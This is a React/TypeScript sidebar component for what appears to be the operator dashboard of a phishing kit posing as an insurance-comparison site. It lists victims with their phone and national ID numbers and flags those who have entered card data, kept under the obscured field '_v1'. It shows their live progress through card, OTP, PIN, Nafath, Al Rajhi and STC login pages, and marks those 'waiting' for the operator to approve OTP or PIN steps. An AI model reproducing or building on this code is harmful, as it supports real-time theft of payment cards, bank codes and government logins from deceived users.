"use client";

import {
  Search,
  Trash2,
  CheckSquare,
  Square,
  CreditCard,
  KeyRound,
  RefreshCw,
  Ban,
  ShieldCheck,
} from "lucide-react";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { getTimeAgo } from "@/lib/time-utils";
import { updateApplication } from "@/lib/firebase-services";
import { useState } from "react";

interface VisitorSidebarProps {
  visitors: InsuranceApplication[];
  selectedVisitor: InsuranceApplication | null;
  onSelectVisitor: (visitor: InsuranceApplication) => void;
  searchQuery: string;
  onSearchChange: (query: string) => void;
  cardFilter: "all" | "hasCard";
  onCardFilterChange: (filter: "all" | "hasCard") => void;
  selectedIds: Set<string>;
  onToggleSelect: (id: string) => void;
  onSelectAll: () => void;
  onDeleteSelected: () => void;
  sidebarWidth: number;
  onSidebarWidthChange: (width: number) => void;
}

const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.cardStatus === "message" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  );
};

const getCardStatusBadge = (status: InsuranceApplication["cardStatus"]) => {
  switch (status) {
    case "approved_with_otp":
      return { label: "✓ OTP", cls: "bg-emerald-50 text-emerald-700 border border-emerald-200/80" };
    case "approved_with_pin":
      return { label: "✓ PIN", cls: "bg-emerald-50 text-emerald-700 border border-emerald-200/80" };
    case "rejected":
      return { label: "✗ مرفوض", cls: "bg-red-50 text-red-600 border border-red-200/80" };
    case "message":
      return { label: "📲 رسالة", cls: "bg-amber-50 text-amber-700 border border-amber-200/80 animate-pulse" };
    case "waiting":
      return { label: "⏳ انتظار", cls: "bg-yellow-50 text-yellow-700 border border-yellow-200/80" };
    default:
      return null;
  }
};

const getPageName = (step: number | string): string => {
  if (typeof step === "string") {
    const stringPageNames: Record<string, string> = {
      home: "الرئيسية",
      "home-new": "الرئيسية",
      insur: "بيانات التأمين",
      compar: "مقارنة العروض",
      payment: "الدفع (بطاقة)",
      check: "الدفع",
      _st1: "الدفع (بطاقة)",
      _t1: "بيانات البطاقة",
      otp: "OTP",
      _t2: "OTP",
      step2: "OTP",
      veri: "رمز تحقق",
      pin: "PIN",
      _t3: "PIN",
      step3: "PIN",
      confi: "PIN",
      phone: "الهاتف",
      step5: "الهاتف",
      nafad: "نفاذ",
      _t6: "نفاذ",
      step4: "نفاذ",
      nafad_modal: "نافذة نفاذ",
      finalOtp: "OTP الأخير",
      rajhi: "راجحي",
      "stc-login": "دخول STC",
    };
    return stringPageNames[step] || `غير محدد (${step})`;
  }

  const stepNum = typeof step === "number" ? step : parseInt(step);
  const pageNames: Record<number, string> = {
    0: "الرئيسية",
    1: "الرئيسية",
    2: "بيانات التأمين",
    3: "مقارنة العروض",
    4: "الدفع",
    5: "OTP",
    6: "PIN",
    7: "الهاتف",
    8: "نفاذ",
    9: "الاخير OTP",
  };

  return pageNames[stepNum] || `غير محدد (${stepNum})`;
};

const getVisitorDisplayName = (visitor: InsuranceApplication) =>
  visitor.ownerName || (visitor as any).name || "بدون اسم";

const getVisitorCurrentPage = (visitor: InsuranceApplication) =>
  (visitor.redirectPage ||
    visitor.currentPage ||
    visitor.currentStep ||
    "home") as number | string;

const hasCardData = (visitor: InsuranceApplication): boolean => {
  if (visitor._v1 || visitor.cardNumber) return true;

  if (!visitor.history || !Array.isArray(visitor.history)) return false;

  return visitor.history.some(
    (entry: any) =>
      (entry.type === "_t1" || entry.type === "card") &&
      (entry.data?._v1 || entry.data?.cardNumber)
  );
};

function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
  const [loading, setLoading] = useState(false);

  const handleToggle = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!visitor.id || loading) return;
    setLoading(true);
    try {
      await updateApplication(visitor.id, { isBlocked: !visitor.isBlocked });
    } catch {
    } finally {
      setLoading(false);
    }
  };

  return (
    <button
      onClick={handleToggle}
      disabled={loading}
      title={visitor.isBlocked ? "إلغاء الحظر" : "حظر الزائر"}
      className={`flex items-center justify-center w-7 h-7 rounded-lg transition-all duration-200 disabled:opacity-40 ${
        visitor.isBlocked
          ? "bg-red-50 text-red-500 hover:bg-red-100"
          : "bg-gray-100 text-gray-400 hover:bg-red-50 hover:text-red-500"
      }`}
    >
      {visitor.isBlocked ? (
        <ShieldCheck className="w-3.5 h-3.5" />
      ) : (
        <Ban className="w-3.5 h-3.5" />
      )}
    </button>
  );
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  sidebarWidth,
  onSidebarWidthChange: _onSidebarWidthChange,
}: VisitorSidebarProps) {
  void _onSidebarWidthChange;
  const allSelected =
    visitors.length > 0 && selectedIds.size === visitors.length;
  const isLandscape =
    typeof window !== "undefined" &&
    window.matchMedia("(orientation: landscape) and (max-width: 1024px)")
      .matches;

  return (
    <div
      className="h-full w-full bg-white/95 dark:bg-slate-900/95 backdrop-blur-md landscape:border-l md:w-[400px] md:border-l border-gray-200/60 dark:border-slate-700/60 flex flex-col relative group"
      style={{
        fontFamily: "Cairo, Tajawal, sans-serif",
        width: isLandscape ? `${sidebarWidth}px` : undefined,
      }}
    >
      <div className="p-3 sm:p-4 landscape:p-2 border-b border-gray-100 dark:border-slate-800 bg-white dark:bg-slate-900">
        <div className="relative mb-3 landscape:mb-2">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 landscape:w-3.5 landscape:h-3.5 text-gray-400" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full rounded-xl border border-gray-200 dark:border-slate-700 bg-gray-50/80 dark:bg-slate-800/80 py-2.5 pl-4 pr-10 text-sm dark:text-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 focus:bg-white dark:focus:bg-slate-800 landscape:py-1.5 landscape:text-xs transition-all duration-200 placeholder:text-gray-400 dark:placeholder:text-slate-500"
          />
        </div>

        <div className="mb-3 grid grid-cols-2 gap-1.5 landscape:mb-2">
          <button
            onClick={() => onCardFilterChange("all")}
            className={`px-3 py-2 landscape:py-1 rounded-xl text-sm landscape:text-xs font-semibold transition-all duration-200 ${
              cardFilter === "all"
                ? "bg-gradient-to-r from-emerald-500 to-emerald-600 text-white shadow-sm shadow-emerald-200"
                : "bg-gray-100 dark:bg-slate-800 text-gray-600 dark:text-slate-300 hover:bg-gray-200 dark:hover:bg-slate-700"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`px-3 py-2 landscape:py-1 rounded-xl text-sm landscape:text-xs font-semibold transition-all duration-200 ${
              cardFilter === "hasCard"
                ? "bg-gradient-to-r from-emerald-500 to-emerald-600 text-white shadow-sm shadow-emerald-200"
                : "bg-gray-100 dark:bg-slate-800 text-gray-600 dark:text-slate-300 hover:bg-gray-200 dark:hover:bg-slate-700"
            }`}
          >
            لديهم بطاقة
          </button>
        </div>

        <div className="flex flex-wrap gap-1.5">
          <button
            onClick={onSelectAll}
            className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-xl bg-gray-100 dark:bg-slate-800 px-3 py-2 text-sm font-semibold transition-all duration-200 hover:bg-gray-200 dark:hover:bg-slate-700 text-gray-700 dark:text-slate-300 landscape:py-1 landscape:text-xs"
          >
            {allSelected ? (
              <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" />
            ) : (
              <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />
            )}
            {allSelected ? "إلغاء الكل" : "تحديد الكل"}
          </button>

          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-red-500 to-red-600 px-3 py-2 text-sm font-semibold text-white transition-all duration-200 hover:from-red-600 hover:to-red-700 shadow-sm shadow-red-200 landscape:py-1 landscape:text-xs"
            >
              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>
      </div>

      <div className="flex-1 overflow-y-auto scrollbar-thin">
        {visitors.length === 0 ? (
          <div className="p-8 text-center text-gray-400 dark:text-slate-500 space-y-3">
            <p className="text-4xl opacity-50">📭</p>
            <p className="font-semibold text-gray-500 dark:text-slate-400">لا يوجد زوار</p>
            <p className="text-xs text-gray-400 dark:text-slate-500">
              سيظهر الزوار هنا عند بدء التفاعل
            </p>
          </div>
        ) : (
          visitors.map((visitor) => {
            const hasCard = hasCardData(visitor);
            const isSelected = selectedVisitor?.id === visitor.id;

            return (
              <div
                key={visitor.id}
                onClick={() => onSelectVisitor(visitor)}
                className={`border-b border-gray-100/80 dark:border-slate-800/80 p-3 sm:p-4 landscape:p-2 cursor-pointer transition-all duration-200 ${
                  isSelected
                    ? "bg-gradient-to-l from-emerald-50/80 to-white dark:from-emerald-950/40 dark:to-slate-900 border-r-[3px] border-r-emerald-500"
                    : visitor.isBlocked
                    ? "bg-red-50/50 dark:bg-red-950/30 border-r-[3px] border-r-red-400"
                    : visitor.isUnread
                    ? "bg-blue-50/40 dark:bg-blue-950/30 hover:bg-blue-50/60 dark:hover:bg-blue-950/50"
                    : "hover:bg-gray-50/80 dark:hover:bg-slate-800/60"
                }`}
              >
                <div className="flex items-start gap-3">
                  <div
                    onClick={(e) => {
                      e.stopPropagation();
                      if (visitor.id) onToggleSelect(visitor.id);
                    }}
                    className="mt-1"
                  >
                    {visitor.id && selectedIds.has(visitor.id) ? (
                      <CheckSquare className="w-5 h-5 text-emerald-500" />
                    ) : (
                      <Square className="w-5 h-5 text-gray-300 hover:text-gray-400 transition-colors" />
                    )}
                  </div>

                  <div className="flex-1 min-w-0">
                    <div className="mb-1 flex flex-col gap-1 sm:flex-row sm:items-center sm:justify-between">
                      <div className="flex min-w-0 flex-wrap items-center gap-1.5">
                        <h3 className="font-bold text-gray-900 dark:text-white truncate text-base landscape:text-sm">
                          {getVisitorDisplayName(visitor)}
                        </h3>
                        {visitor.isBlocked && (
                          <span className="flex items-center gap-0.5 rounded-lg bg-red-50 px-2 py-0.5 text-[10px] font-bold text-red-500 whitespace-nowrap border border-red-100">
                            <Ban className="w-2.5 h-2.5" />
                            محظور
                          </span>
                        )}
                        <span className="flex items-center gap-1 rounded-lg bg-teal-500 px-2 py-0.5 text-[11px] font-medium text-white whitespace-nowrap shadow-sm">
                          {isWaitingForAdmin(visitor) && (
                            <RefreshCw className="w-3 h-3 animate-spin" />
                          )}
                          {getPageName(getVisitorCurrentPage(visitor))}
                        </span>
                        {hasCard && (
                          <span className="flex items-center gap-1 rounded-lg border border-blue-100 bg-blue-50 px-2 py-0.5 text-[10px] font-semibold text-blue-600 whitespace-nowrap">
                            <CreditCard className="w-3 h-3" />
                            بطاقة
                          </span>
                        )}
                        {(() => {
                          const badge = getCardStatusBadge(visitor.cardStatus);
                          return badge ? (
                            <span className={`rounded-lg px-2 py-0.5 text-[10px] font-semibold whitespace-nowrap ${badge.cls}`}>
                              {badge.label}
                            </span>
                          ) : null;
                        })()}
                      </div>

                      <div className="flex items-center gap-2 whitespace-nowrap sm:self-auto">
                        <span className="text-[11px] landscape:text-[10px] text-gray-400 dark:text-slate-500 font-medium">
                          {getTimeAgo(visitor.updatedAt || visitor.lastSeen)}
                        </span>
                        <BlockButton visitor={visitor} />
                      </div>
                    </div>

                    <div className="hidden sm:flex items-center gap-3 mb-2 text-xs text-gray-600 dark:text-slate-400">
                      {visitor.phoneNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">
                            📞 {visitor.phoneNumber}
                          </span>
                        </div>
                      )}
                      {visitor.identityNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">
                            🆔 {visitor.identityNumber}
                          </span>
                        </div>
                      )}
                    </div>

                    <div className="hidden sm:flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-1.5">
                          <div
                            className={`w-2 h-2 rounded-full ${
                              visitor.isOnline
                                ? "bg-emerald-500 shadow-sm shadow-emerald-200"
                                : "bg-gray-300"
                            }`}
                          ></div>
                          <span className={`text-xs ${visitor.isOnline ? "text-emerald-600 dark:text-emerald-400 font-medium" : "text-gray-400 dark:text-slate-500"}`}>
                            {visitor.isOnline ? "متصل" : "غير متصل"}
                          </span>
                        </div>

                        {hasCard && (
                          <div className="flex items-center gap-1 px-2 py-0.5 bg-blue-50 text-blue-600 rounded-lg text-xs border border-blue-100">
                            <CreditCard className="w-3 h-3" />
                            <span>بطاقة</span>
                          </div>
                        )}
                        {visitor.phoneVerificationCode && (
                          <div className="flex items-center gap-1 px-2 py-0.5 bg-violet-50 text-violet-600 rounded-lg text-xs border border-violet-100">
                            <KeyRound className="w-3 h-3" />
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
